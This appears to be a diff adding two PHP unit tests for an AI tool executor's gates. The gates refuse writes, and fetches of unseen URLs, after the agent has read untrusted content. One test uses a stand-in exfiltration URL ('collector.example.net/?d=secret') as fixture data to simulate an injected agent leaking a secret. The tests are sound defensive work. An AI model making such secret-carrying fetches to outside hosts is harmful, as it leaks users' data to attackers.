@@ -55,6 +55,44 @@ class MCPToolExecutorWriteAfterUntrustedReadTest extends UnitTestCase
         self::assertSame(MCPToolResponse::REFUSAL_WRITE_AFTER_UNTRUSTED_READ, $refusal->refusalKind);
     }
 
+    public function testUnderOffAWriteAfterAnUntrustedReadRunsAlsoInADelegationChild(): void
+    {
+        $executor = new UntrustedReadGateToolExecutor();
+        $executor->writeAfterUntrustedReadMode = MCPToolContentTrust::WRITE_AFTER_UNTRUSTED_READ_OFF;
+        // the consent step refuses (as it does for a delegated sub-task or a scheduled run): under off it is never asked
+        $request = OwnerConsentRequest::forAction('probeWriteRecord', 'WRITE_AFTER_UNTRUSTED_READ', 'target', 'consequence', 'key');
+        $executor->givenOwnerConsentReservation = OwnerConsentReservation::notReserved($request, OwnerConsentVerdict::failed(OwnerConsentVerdict::FAILURE_SITE_OFF));
+
+        self::assertNull($this->holdCall('probeWriteRecord', [], $this->provenanceAfterReading('probeReadForeignText'), $executor), 'no refusal, also where consent cannot be asked');
+        self::assertNull(self::getPropertyValue($executor, 'untrustedReadConsentReservation'), 'no consent reserved');
+    }
+
+    public function testTheUnseenUrlRefusalHasItsOwnKey(): void
+    {
+        $executor = new UntrustedReadGateToolExecutor();
+        $executor->writeAfterUntrustedReadMode = MCPToolContentTrust::WRITE_AFTER_UNTRUSTED_READ_OFF;
+        $provenance = $this->provenanceAfterReading('probeReadForeignText');
+        self::assertSame(
+            MCPToolResponse::REFUSAL_UNSEEN_URL_AFTER_UNTRUSTED_READ,
+            $this->holdCall('probeFetchPage', ['url' => 'https://collector.example.net/?d=secret'], $provenance, $executor)?->refusalKind,
+            'refused with the write gate off'
+        );
+        $executor->unseenUrlAfterUntrustedReadMode = MCPToolContentTrust::UNSEEN_URL_AFTER_UNTRUSTED_READ_OFF;
+        self::assertNull($this->holdCall('probeFetchPage', ['url' => 'https://collector.example.net/?d=secret'], $provenance, $executor));
+
+        $consentExecutor = new UntrustedReadGateToolExecutor();
+        $consentExecutor->unseenUrlAfterUntrustedReadMode = MCPToolContentTrust::UNSEEN_URL_AFTER_UNTRUSTED_READ_OFF;
+        $consentExecutor->givenOwnerConsentReservation = OwnerConsentReservation::notReserved(
+            OwnerConsentRequest::forAction('probeWriteRecord', 'WRITE_AFTER_UNTRUSTED_READ', 'target', 'consequence', 'key'),
+            OwnerConsentVerdict::failed(OwnerConsentVerdict::FAILURE_SITE_OFF)
+        );
+        self::assertSame(
+            MCPToolResponse::REFUSAL_OWNER_CONFIRMATION_REQUIRED,
+            $this->holdCall('probeWriteRecord', [], $provenance, $consentExecutor)?->refusalKind,
+            'the URL key leaves the write gate as configured'
+        );
+    }
+
     public function testReadsWorkspaceCallsAndOwnConsentStepsPass(): void
     {
         $provenance = $this->provenanceAfterReading('probeReadForeignText');
